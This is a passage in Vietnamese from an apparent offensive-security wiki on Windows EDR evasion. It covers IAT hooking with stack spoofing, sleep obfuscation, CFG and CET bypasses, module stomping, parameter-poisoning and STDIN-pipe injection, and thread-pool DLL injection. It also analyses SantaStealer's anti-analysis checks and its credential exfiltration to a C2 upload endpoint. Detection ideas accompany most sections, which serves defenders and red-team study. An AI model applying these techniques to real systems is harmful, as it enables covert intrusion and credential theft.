- Khôi phục khả năng sử dụng đáng tin cậy các lệnh hậu khai thác tạo process trước những cơ chế phát hiện dựa trên call stack bằng cách bọc CreateProcessA/W.

Phác thảo IAT hook tối giản (mã giả x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Ghi chú
- Áp dụng patch sau relocations/ASLR và trước lần đầu sử dụng import. Các reflective loader như TitanLdr/AceLdr minh họa cách hooking trong DllMain của module đã load.
- Giữ wrapper nhỏ gọn và an toàn với PIC; resolve API thực qua giá trị IAT gốc đã lưu trước khi patch hoặc qua LdrGetProcedureAddress.
- Dùng chuyển đổi RW → RX cho PIC và tránh để lại các trang vừa writable vừa executable.

Stub giả mạo call stack
- Các PIC stub kiểu Draugr dựng một chuỗi call giả (địa chỉ trả về trỏ vào các module lành tính), rồi pivot sang API thực.
- Cách này đánh lừa các cơ chế phát hiện kỳ vọng stack chuẩn từ Beacon/BOFs đến các API nhạy cảm.
- Kết hợp với kỹ thuật stack cutting/stack stitching để đi vào các frame dự kiến trước prologue của API.

Tích hợp vận hành
- Đặt reflective loader ở đầu các post-ex DLL để PIC và hooks tự khởi tạo khi DLL được load.
- Dùng Aggressor script để đăng ký các API mục tiêu, giúp Beacon và BOFs sử dụng cùng đường evasion một cách trong suốt mà không cần thay đổi code.

Các lưu ý về detection/DFIR
- Tính toàn vẹn IAT: các entry resolve thành địa chỉ không thuộc image (heap/anon); xác minh định kỳ các import pointer.
- Bất thường trong stack: địa chỉ trả về không thuộc image đã load; chuyển đột ngột sang PIC không thuộc image; chuỗi kế thừa RtlUserThreadStart không nhất quán.
- Telemetry của loader: tiến trình ghi vào IAT; hoạt động DllMain sớm làm thay đổi import thunk; vùng RX bất ngờ được tạo khi load.
- Evasion khi load image: nếu hooking LoadLibrary*, hãy theo dõi các lần load đáng ngờ của automation/clr assembly có tương quan với sự kiện che giấu memory.

Các building block và ví dụ liên quan
- Reflective loader thực hiện IAT patching trong lúc load (ví dụ: TitanLdr, AceLdr)
- Hook che giấu memory (ví dụ: simplehook) và PIC stack cutting (stackcutting)
- PIC stub giả mạo call stack (ví dụ: Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks qua PICO thường trú

Nếu kiểm soát reflective loader, bạn có thể hook import **trong lúc** `ProcessImports()` chạy bằng cách thay pointer `GetProcAddress` của loader bằng một custom resolver kiểm tra hooks trước:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Tạo một **PICO thường trú** (đối tượng PIC bền vững) tồn tại sau khi transient loader PIC tự giải phóng.
- Export hàm `setup_hooks()` để ghi đè import resolver của loader (ví dụ: `funcs.GetProcAddress = _GetProcAddress`).
- Trong `_GetProcAddress`, bỏ qua import theo ordinal và dùng tra cứu hook dựa trên hash như `__resolve_hook(ror13hash(name))`. Nếu có hook, trả về nó; nếu không, gọi tiếp `GetProcAddress` thực.
- Đăng ký các hook mục tiêu khi link bằng các entry Crystal Palace `addhook "MODULE$Func" "hook"`. Hook vẫn hợp lệ vì nó nằm trong PICO thường trú.

Cách này tạo **chuyển hướng IAT ngay lúc import** mà không cần patch code section của DLL đã load sau khi load.

### Buộc có import có thể hook khi target dùng PEB-walking

Import-time hooks chỉ được kích hoạt nếu function thực sự nằm trong IAT của target. Nếu module resolve API bằng PEB-walk + hash (không có import entry), hãy ép tạo một import thực để loader xử lý qua `ProcessImports()`:

- Thay việc resolve export bằng hash (ví dụ: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bằng tham chiếu trực tiếp như `&WaitForSingleObject`.
- Compiler sẽ tạo IAT entry, cho phép chặn khi reflective loader resolve import.

### Obfuscation khi sleep/idle kiểu Ekko mà không patch `Sleep()`

Thay vì patch `Sleep`, hãy hook các primitive wait/IPC thực tế mà implant sử dụng (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Với các lần wait dài, bọc lời gọi bằng chuỗi obfuscation kiểu Ekko để mã hóa image trong memory khi idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Dùng `CreateTimerQueueTimer` để lên lịch chuỗi callback gọi `NtContinue` với các frame `CONTEXT` được tạo sẵn.
- Chuỗi điển hình (x64): chuyển image sang `PAGE_READWRITE` → mã hóa RC4 bằng `advapi32!SystemFunction032` trên toàn bộ mapped image → thực hiện blocking wait → giải mã RC4 → **khôi phục quyền theo từng section** bằng cách duyệt các PE section → báo hiệu hoàn tất.
- `RtlCaptureContext` cung cấp `CONTEXT` mẫu; sao chép nó thành nhiều frame và đặt register (`Rip/Rcx/Rdx/R8/R9`) để gọi từng bước.

Chi tiết vận hành: trả về “success” cho các lần wait dài (ví dụ: `WAIT_OBJECT_0`) để caller tiếp tục trong khi image đang được che giấu. Mẫu này ẩn module khỏi scanner trong các khoảng idle và tránh dấu hiệu đặc trưng của kiểu “patched `Sleep()`”.

Ý tưởng detection (dựa trên telemetry)
- Các đợt callback `CreateTimerQueueTimer` trỏ đến `NtContinue`.
- `advapi32!SystemFunction032` được dùng trên các buffer lớn, liên tục, có kích thước bằng image.
- `VirtualProtect` trên vùng lớn, sau đó khôi phục quyền tùy chỉnh theo từng section.

### Đăng ký CFG lúc runtime cho gadget sleep-obfuscation

Trên các target bật CFG, lần indirect jump đầu tiên vào gadget giữa function như `jmp [rbx]` hoặc `jmp rdi` thường khiến process crash với `STATUS_STACK_BUFFER_OVERRUN` vì gadget không có trong metadata CFG của module. Để các chain kiểu Ekko/Kraken tiếp tục hoạt động trong process được harden:<sup>[[30]](#references)</sup>

- Đăng ký mọi đích indirect mà chain sử dụng bằng `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` và các entry `CFG_CALL_TARGET_VALID`.
- Với địa chỉ trong image đã load (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` phải bắt đầu tại **image base** và bao phủ **toàn bộ kích thước image**.
- Với vùng được map thủ công/PIC/stomped, hãy dùng **allocation base** và kích thước allocation.
- Đánh dấu không chỉ dispatch gadget mà cả các export được gọi gián tiếp (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, các wait/event syscall) và mọi section executable do attacker kiểm soát sẽ trở thành đích indirect.

Cách này biến các chain sleep kiểu ROP/JOP từ “chỉ hoạt động trong process không bật CFG” thành primitive có thể tái sử dụng cho `explorer.exe`, trình duyệt, `svchost.exe` và các endpoint khác được biên dịch với `/guard:cf`.

### Giả mạo stack an toàn với CET cho thread đang sleep

Thay thế toàn bộ `CONTEXT` dễ gây chú ý và có thể lỗi trên hệ thống CET Shadow Stack vì `Rip` giả mạo vẫn phải khớp với hardware shadow stack. Mẫu che giấu sleep an toàn hơn là:<sup>[[30]](#references)</sup>

- Chọn một thread khác trong cùng process và đọc giới hạn stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) qua `NtQueryInformationThread`.
- Sao lưu TEB/TIB thực của thread hiện tại.
- Chụp context thực của thread đang sleep bằng `GetThreadContext`.
- Chỉ sao chép `Rip` thực vào context giả, giữ nguyên `Rsp`/trạng thái stack giả.
- Trong thời gian sleep, sao chép `NT_TIB` của thread giả vào TEB hiện tại để stack walker unwind bên trong một vùng stack hợp lệ.
- Sau khi wait kết thúc, khôi phục TIB và thread context ban đầu.

Cách này giữ instruction pointer nhất quán với CET, đồng thời đánh lừa stack walker của EDR vốn dựa vào metadata stack trong TEB để xác thực quá trình unwind.

### Phương án thay thế dựa trên APC: Kraken Mask

Nếu dispatch bằng timer queue quá dễ bị nhận diện, có thể thực thi cùng chuỗi sleep-encrypt-spoof-restore từ một helper thread đang suspended bằng queued APC:<sup>[[27]](#references)</sup>

- Tạo helper thread với `NtTestAlert` làm entrypoint.
- Queue các frame `CONTEXT`/APC đã chuẩn bị bằng `NtQueueApcThread` và xử lý chúng bằng `NtAlertResumeThread`.
- Lưu trạng thái chain trên heap thay vì stack của helper để tránh dùng hết stack thread mặc định 64 KB.
- Dùng `NtSignalAndWaitForSingleObject` để báo hiệu start event và block một cách nguyên tử.
- Suspend main thread trước khi khôi phục TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) để giảm khoảng thời gian race mà scanner có thể bắt gặp stack mới khôi phục một phần.

Cách này thay dấu hiệu `CreateTimerQueueTimer` + `NtContinue` bằng dấu hiệu helper-thread/APC, đồng thời giữ nguyên mục tiêu RC4 masking và stack spoofing.

Ý tưởng detection bổ sung
- `NtSetInformationVirtualMemory` với `VmCfgCallTargetInformation` ngay trước các lần sleep, wait hoặc APC dispatch.
- `GetThreadContext`/`SetThreadContext` được gọi quanh `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` hoặc `ConnectNamedPipe`.
- `NtQueryInformationThread` theo sau bởi thao tác ghi trực tiếp vào giới hạn stack TEB/TIB của thread hiện tại.
- Các chain `NtQueueApcThread`/`NtAlertResumeThread` gián tiếp gọi `SystemFunction032`, `VirtualProtect` hoặc helper khôi phục quyền section.
- Việc sử dụng lặp lại các gadget có signature ngắn như `FF 23` (`jmp [rbx]`) hoặc `FF E7` (`jmp rdi`) làm dispatch pivot bên trong các module đã ký.

## Precision Module Stomping

Module stomping thực thi payload từ **`.text` section của một DLL đã được map trong target process** thay vì cấp phát private executable memory dễ thấy hoặc load một DLL hy sinh mới. Đích ghi đè nên là một **image đã load, được hỗ trợ bởi file trên đĩa** với code space đủ lớn để chứa payload mà không làm hỏng các code path process vẫn cần dùng.<sup>[[1]](#references)[[2]](#references)</sup>

### Chọn target đáng tin cậy

Stomping đơn giản lên các module phổ biến như `uxtheme.dll` hoặc `comctl32.dll` rất dễ lỗi: DLL có thể chưa được load vào remote process, và vùng code quá nhỏ sẽ làm process crash. Quy trình đáng tin cậy hơn:

1. Liệt kê module của target process và chỉ giữ danh sách include **chỉ gồm tên** các DLL đã load.
2. Build payload trước và ghi lại **kích thước byte chính xác**.
3. Scan các DLL khả thi trên đĩa và so sánh PE section **`.text` `Misc_VirtualSize`** với kích thước payload. Điều này quan trọng hơn kích thước file vì nó phản ánh kích thước của executable section **khi được map vào memory**.
4. Parse **Export Address Table (EAT)** và chọn RVA của một exported function làm offset bắt đầu stomp.
5. Tính **blast radius**: nếu payload vượt quá ranh giới của function được chọn, nó sẽ ghi đè các export liền kề nằm sau function đó trong memory.

Các helper recon/chọn target thường thấy ngoài thực tế:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Ưu tiên các DLL **đã được nạp** trong tiến trình từ xa để tránh telemetry từ `LoadLibrary`/các lần nạp image bất ngờ.
- Ưu tiên các export mà ứng dụng đích hiếm khi thực thi; nếu không, các code path thông thường có thể chạm vào những byte bị stomp trước hoặc sau khi tạo thread.
- Các implant lớn thường cần thay đổi cách nhúng shellcode từ string literal sang **byte-array/braced initializer** để toàn bộ buffer được biểu diễn chính xác trong mã nguồn injector.

Detection ideas
- Ghi dữ liệu từ xa vào các trang executable được backing bởi image (`MEM_IMAGE`, `PAGE_EXECUTE*`) thay vì các vùng cấp phát RWX/RX private phổ biến hơn.
- Các export entry point có byte trong bộ nhớ không còn khớp với file backing trên đĩa.
- Remote thread hoặc context pivot bắt đầu thực thi bên trong một export của DLL hợp lệ có những byte đầu vừa bị sửa đổi.
- Các chuỗi `VirtualProtect(Ex)` / `WriteProcessMemory` đáng ngờ nhắm vào các trang `.text` của DLL, sau đó tạo thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) là một kỹ thuật **process-injection / EDR-evasion** tránh đường ghi từ xa cổ điển (`VirtualAllocEx` + `WriteProcessMemory`). Thay vì sao chép byte vào một tiến trình đích đang chạy, kỹ thuật này lợi dụng việc Windows **sao chép các tham số khởi động được chọn của `CreateProcessW` vào tiến trình con** và lưu chúng bên trong `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Các carrier có thể bị poison được `CreateProcessW` sao chép

Các carrier hữu ích gồm:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (với `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Các ràng buộc thực tế của carrier:

- `lpCommandLine` phải trỏ đến **bộ nhớ có thể ghi** để `CreateProcessW` sử dụng và bị giới hạn ở **32,767 ký tự Unicode**, bao gồm ký tự null kết thúc.
- `lpEnvironment` phải là một environment block Unicode gồm các chuỗi `NAME=VALUE\0` liên tiếp, kết thúc bằng một `\0` bổ sung.
- `lpReserved` chính thức được dành riêng, vì vậy ánh xạ `ShellInfo` nên được xem là chi tiết triển khai chứ không phải một hợp đồng ổn định được tài liệu hóa.

Điều này biến việc tạo tiến trình thông thường thành **primitive truyền payload**. Operator tạo tiến trình con với dữ liệu khởi động do attacker kiểm soát và để Windows thực hiện việc sao chép liên tiến trình.

### Luồng tra cứu từ xa không dùng API ghi từ xa

Sau khi tiến trình con được tạo, hãy phân giải buffer đã sao chép bằng các primitive **chỉ đọc**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → lấy `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Đọc `PEB` từ xa
3. Lần theo `PEB.ProcessParameters`
4. Đọc `RTL_USER_PROCESS_PARAMETERS`
5. Sử dụng con trỏ đã chọn:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Luồng tối thiểu:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Thực thi vùng đệm tham số đã sao chép

Vùng tham số được sao chép thường có quyền `RW`, không có quyền thực thi. Một chuỗi P3 phổ biến là:

1. Tạo tiến trình bình thường (không ở trạng thái tạm dừng)
2. Cấp quyền thực thi cho trang tham số đã chọn bằng `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tái sử dụng handle của main thread đã được trả về trong `PROCESS_INFORMATION`
4. Chuyển hướng thực thi bằng `NtSetContextThread` (`CONTEXT_CONTROL`, ghi đè `RIP`)

Không giống các workflow thread hijacking cổ điển, cách này **không yêu cầu** `SuspendThread` / `ResumeThread`; có thể thay đổi context trực tiếp trên handle main thread được trả về.

Cách này tránh một số API thường bị giám sát để phát hiện injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- thường cả `SuspendThread` / `ResumeThread`

### Giới hạn null byte và shellcode phân tầng

Cả ba carrier đều là **dữ liệu dạng chuỗi hoặc tương tự chuỗi**, vì vậy payload thô chứa `0x00` sẽ bị cắt cụt trong quá trình truyền. Một giải pháp khả thi là dùng **stage đầu tiên không chứa null byte** để tái tạo các hằng số lúc chạy, sau đó nạp stage thứ hai tùy ý.

Một mẫu đơn giản là tổng hợp hằng số dựa trên XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Điều này cho phép stage đầu tiên tạo chuỗi trên stack, đối số API, đường dẫn DLL hoặc trình tải shellcode stage thứ hai mà không nhúng byte null vào tham số được truyền.

### Các lệnh gọi API dựa trên stack từ stage đầu tiên

Khi stage đầu tiên cần gọi các API như `LoadLibraryA`, nó có thể:

- đẩy chuỗi/buffer lên stack của tiến trình đích
- dành vùng **shadow space 32 byte trên x64**
- đặt `RCX`, `RDX`, `R8`, `R9` thành các hằng số hoặc con trỏ tương đối với `RSP`
- giữ `RSP` **căn chỉnh 16 byte** trước khi gọi

Sau đó, stage thứ hai có thể được sao chép từ stack vào vùng cấp phát `PAGE_READWRITE`, chuyển sang `PAGE_EXECUTE_READ` bằng `VirtualProtect` rồi nhảy đến đó, tránh cấp phát RWX trực tiếp.

### Ý tưởng phát hiện

Các cơ hội săn tìm đáng chú ý do tác giả nêu ra:

- `VirtualProtectEx` / `NtProtectVirtualMemory` chuyển **các trang tham số tiến trình thành executable**
- thay đổi bảo vệ đó theo sau bởi `SetThreadContext` / `NtSetContextThread`
- đọc từ xa `PEB`, rồi đến `RTL_USER_PROCESS_PARAMETERS`
- giá trị `lpCommandLine`, `lpEnvironment` hoặc `STARTUPINFO.lpReserved` dài bất thường / có entropy cao trong lúc tạo tiến trình

### Ghi chú

- P3 là một **thủ thuật truyền dữ liệu giữa các tiến trình**, bản thân nó không phải primitive thực thi hoàn chỉnh: tham số được sao chép vẫn cần được đổi sang quyền execute và cần có phương thức chuyển hướng thực thi.
- Các tác giả đã cân nhắc `RtlCreateProcessReflection` / Dirty Vanity nhưng loại bỏ vì kỹ thuật này bên trong vẫn gọi đến các primitive đáng ngờ như `NtWriteVirtualMemory` và `NtCreateThreadEx`.

Để chuyển payload vào một tiến trình Windows **đang tồn tại** thông qua thread description, sau đó chiếm quyền điều khiển địa chỉ trả về của thread đang chờ, xem [Gọi tên Thread và Chiếm quyền điều khiển Thread đang chờ](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Tiêm qua pipe STDIN của Console

Một tiến trình con console tương tác cũng có thể được dùng làm **primitive truyền payload**. Injector chuyển hướng standard input của tiến trình con sang một pipe rồi gửi một marker theo sau là shellcode. Sau khi chương trình console đọc dữ liệu vào vùng nhớ riêng của chính nó, injector tìm buffer đó, cấp quyền executable cho nó và chuyển hướng một thread của tiến trình con đến đó. Cách này tránh dùng `VirtualAllocEx` và `WriteProcessMemory`, nhưng vẫn là process injection chứ không phải một EDR bypass tổng quát.<sup>[[41]](#references)</sup>

Dù được mô tả là "named-pipe", implementation tham chiếu gọi `CreatePipe`, hàm này tạo một **anonymous pipe**. Windows triển khai anonymous pipe bằng các đối tượng pipe có tên duy nhất ở bên trong, nhưng PoC không chọn đường dẫn `\\.\pipe\<name>` hay gọi `CreateNamedPipe`. Nó tạo các handle có thể kế thừa với security descriptor mặc định, đặt handle đọc vào `STARTUPINFO.hStdInput`, đặt `STARTF_USESTDHANDLES` và khởi chạy một tiến trình con mới với tính năng kế thừa handle được bật. Do đó, PoC này khởi chạy console executable được cung cấp; nó không gắn pipe vào một tiến trình đang tồn tại.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Quy trình tham chiếu

Implementation sử dụng chuỗi thao tác sau:<sup>[[41]](#references)</sup>

1. Tạo các cặp anonymous pipe cho `STDIN` và `STDOUT` của tiến trình con. Tắt tính năng kế thừa trên hai handle phía tiến trình cha và đóng các bản sao handle phía tiến trình con trong tiến trình cha sau khi tạo tiến trình.
2. Khởi chạy một executable tương tác như `netsh.exe` hoặc `nslookup.exe` với `CREATE_NEW_CONSOLE`. Tiến trình con kế thừa các standard handle đã được chuyển hướng.
3. Gửi toàn bộ mảng nhị phân `rawData` bằng `WriteFile` qua handle `STDIN` phía tiến trình cha. Chương trình console đọc các byte và để lại một bản sao trong một trong các vùng nhớ đã commit riêng của nó.
4. Duyệt không gian địa chỉ của tiến trình con bằng `VirtualQueryEx`, đọc các vùng `MEM_PRIVATE` tiềm năng bằng `ReadProcessMemory` và tìm marker ở đầu `rawData`.
5. Đổi buffer đã tìm thấy thành `PAGE_EXECUTE_READWRITE` bằng `VirtualProtectEx`.
6. Xác định main thread, suspend thread đó, đặt `RIP` thành `found_address + 0x19` bằng `NtSetContextThread`, rồi resume thread.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Implementation được cung cấp dành riêng cho x64: nó sửa đổi `CONTEXT.Rip`, và payload nhúng bên trong là shellcode x64. `rawData` bắt đầu bằng marker dài 25 byte, vì vậy các byte thực thi bắt đầu tại offset hexadecimal `0x19`. Khi thay payload, hãy giữ nguyên bố cục đó hoặc cập nhật đồng bộ marker, search vector, kích thước mảng và execution offset. Các comment trong source cũng liệt kê `0x0A`, `0x0D` và `0x1A` là bad character. Workflow này không thay đổi token hoặc quyền của tiến trình con.<sup>[[41]](#references)</sup>

Để xem các mẫu biên dịch payload và helper native nhỏ, hãy tham khảo [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection bằng thread-pool callback không cần shellcode (DLLParty)

DLLParty điều chỉnh kiểu injection thread-pool của PoolParty để khiến một worker hiện có của target gọi `LoadLibraryA`, thay vì thực thi callback stub được injection. Primitive điều phối của nó là một completion `TP_DIRECT` được đưa vào I/O completion port của pool trên target. Cách này không bypass quyền tiến trình: PoC gọi `OpenProcess(PROCESS_ALL_ACCESS)` và cần quyền đọc/ghi bộ nhớ của target, cùng các handle worker-factory và completion-port có thể được duplicate.<sup>[[46]](#references)[[47]](#references)</sup>

Trên Windows x64, worker truyền một con trỏ tới `TP_CALLBACK_INSTANCE` nằm trên stack của nó vào `RCX`, đối số callback đầu tiên. `LoadLibraryA` diễn giải chính con trỏ đó thành `LPCSTR`. Trên đường thực thi đã kiểm thử, `TppWorkerThread` tạo con trỏ tại `RSP+0x178`, trong khi thao tác ghi thông thường đầu tiên của nó vào object đó nằm tại `RSP+0x1d0`. Do đó, một đường dẫn DLL kết thúc bằng null và nằm gọn trong 0x58 byte đầu tiên có thể được đặt ở đầu instance mà không bị ghi đè trước khi dispatch. Đây là quan sát riêng cho build đã kiểm thử, không phải bảo đảm ABI Windows được tài liệu hóa.<sup>[[46]](#references)[[47]](#references)</sup>

Workflow tham khảo:<sup>[[46]](#references)[[47]](#references)</sup>

1. Liệt kê các handle của target bằng `NtQuerySystemInformation(SystemHandleInformation)` và xác định `TpWorkerFactory` bằng cách truy vấn loại object. Duplicate một handle worker-factory và truy vấn `WorkerFactoryBasicInformation`; `StartParameter` cung cấp `TP_POOL` từ xa. Bỏ qua các factory có `TotalWorkerCount == 0`.
2. Đọc `TP_POOL.CompletionPort` và duyệt danh sách worker riêng của pool. Trên build Windows 10 19045 x64 đã kiểm thử (`ntdll.dll 10.0.19041.4842`), head nằm tại `pool+0x60`; mỗi link nằm tại `worker+0x10`, vì vậy slot callback-instance tại `worker+0x38` bằng `link+0x28`. PoC kiểm tra alignment của con trỏ, tính thuận nghịch của link, quyền sở hữu pool, thread ID khác 0, node lặp lại và head danh sách ổn định.
3. Ghi đường dẫn DLL vào **mọi** slot worker tìm được vì completion được đưa vào hàng đợi có thể được worker bất kỳ xử lý. Đặt một `TP_DIRECT` có `Callback = LoadLibraryA` trong bộ nhớ ghi được của target. PoC dùng `last_slot-0x500` trên stack của worker thay vì `VirtualAllocEx`; offset này dựa trên thử nghiệm và không được trùng với dữ liệu stack đang hoạt động.
4. Duplicate handle completion-port của target và gọi `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Địa chỉ `TP_DIRECT` từ xa là completion key. Một worker hiện có sau đó gọi `LoadLibraryA` với con trỏ callback-instance đã bị ghi đè, tải một DLL mà target có thể truy cập.

PoC nhận PID của target (`DLLParty.exe <target_pid>`) và dùng đường dẫn DLL hard-code trong `DLLParty.cpp`; hãy đặt một đường dẫn target có thể truy cập trước khi build executable x64. PoC cũng dùng địa chỉ `LoadLibraryA` trong tiến trình của chính nó làm callback từ xa, nên giả định địa chỉ đó hợp lệ trong target. Code không kiểm tra độ dài đường dẫn so với prefix 0x58 byte hoặc xác nhận việc duyệt worker đã tìm được slot trước khi truy cập phần tử cuối cùng. Hãy xác minh lại các offset riêng, bố cục stack và vùng bộ nhớ ghi được cho build của target. Việc không dùng `CreateRemoteThreadEx`, shellcode và `VirtualAllocEx` không loại bỏ các thao tác ghi xuyên tiến trình hoặc telemetry về DLL-load.<sup>[[46]](#references)[[47]](#references)</sup>

## Tradecraft của SantaStealer để né tránh fileless và đánh cắp credential

SantaStealer (còn gọi là BluelineStealer) cho thấy cách các info-stealer hiện đại kết hợp AV bypass, anti-analysis và truy cập credential trong một workflow duy nhất.<sup>[[24]](#references)</sup>

### Chặn theo keyboard layout và trì hoãn trong sandbox

- Một cờ cấu hình (`anti_cis`) liệt kê các keyboard layout đã cài đặt bằng `GetKeyboardLayoutList`. Nếu tìm thấy layout Cyrillic, mẫu tạo một marker `CIS` rỗng rồi kết thúc trước khi chạy stealer, đảm bảo nó không kích hoạt tại các locale bị loại trừ, đồng thời để lại artifact phục vụ hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logic `check_antivm` nhiều lớp

- Biến thể A duyệt danh sách tiến trình, băm tên từng tiến trình bằng checksum cuộn tùy chỉnh rồi so sánh với các blocklist nhúng dành cho debugger/sandbox; nó lặp lại checksum trên tên máy tính và kiểm tra các thư mục làm việc như `C:\analysis`.
- Biến thể B kiểm tra các thuộc tính hệ thống (ngưỡng số lượng tiến trình tối thiểu, thời gian hoạt động gần đây), gọi `OpenServiceA("VBoxGuest")` để phát hiện VirtualBox additions và kiểm tra thời gian quanh các khoảng nghỉ để phát hiện việc thực hiện từng bước. Nếu phát hiện bất kỳ dấu hiệu nào, chương trình sẽ dừng trước khi khởi chạy các module.

### Helper không dùng file + nạp phản chiếu ChaCha20 hai lớp

- DLL/EXE chính nhúng một helper lấy thông tin xác thực của Chromium; helper này được ghi ra đĩa hoặc ánh xạ thủ công vào bộ nhớ. Ở chế độ không dùng file, helper tự phân giải imports/relocations nên không tạo artifact trên đĩa.
- Helper lưu một DLL giai đoạn hai được mã hóa hai lần bằng ChaCha20 (hai khóa 32 byte + nonce 12 byte). Sau cả hai lượt giải mã, nó nạp blob bằng reflective loading (không dùng `LoadLibrary`) và gọi các exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` có nguồn gốc từ [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Các routine ChromElevator dùng direct-syscall reflective process hollowing để inject vào một trình duyệt Chromium đang chạy, kế thừa các khóa AppBound Encryption và giải mã mật khẩu/cookie/thẻ tín dụng trực tiếp từ cơ sở dữ liệu SQLite, bất chấp các biện pháp hardening của ABE.

### Thu thập trong bộ nhớ theo module & exfil HTTP chia khúc

- `create_memory_based_log` lặp qua bảng con trỏ hàm `memory_generators` toàn cục và tạo một thread cho mỗi module được bật (Telegram, Discord, Steam, ảnh chụp màn hình, tài liệu, tiện ích mở rộng trình duyệt, v.v.). Mỗi thread ghi kết quả vào các buffer dùng chung và báo số lượng file sau khoảng 45 giây chờ join.
- Khi hoàn tất, toàn bộ dữ liệu được nén thành `%TEMP%\\Log.zip` bằng thư viện `miniz` liên kết tĩnh. Sau đó, `ThreadPayload1` nghỉ 15 giây rồi truyền archive theo các khúc 10 MB qua HTTP POST tới `http://<C2>:6767/upload`, giả mạo boundary `multipart/form-data` của trình duyệt (`----WebKitFormBoundary***`). Mỗi khúc bổ sung `User-Agent: upload`, `auth: <build_id>`, tùy chọn `w: <campaign_tag>`; khúc cuối thêm `complete: true` để C2 biết việc ghép lại đã hoàn tất.

## References

- [1] [Kỹ thuật né tránh nâng cao: Module Stomping chính xác](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack: không còn đường thoát miễn phí cho malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – tài liệu](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – mẫu](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – mẫu](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC giả mạo call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Chuỗi lây nhiễm mới và kỹ thuật làm rối dựa trên ConfuserEx của DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Có nên tin vào zero trust của bạn? Vượt qua kiểm tra tư thế bảo mật của Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Trước ToolShell: Khám phá các hoạt động ransomware trước đây của Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Lạm dụng các export được chuyển tiếp](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Danh mục Forwarded Exports của Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
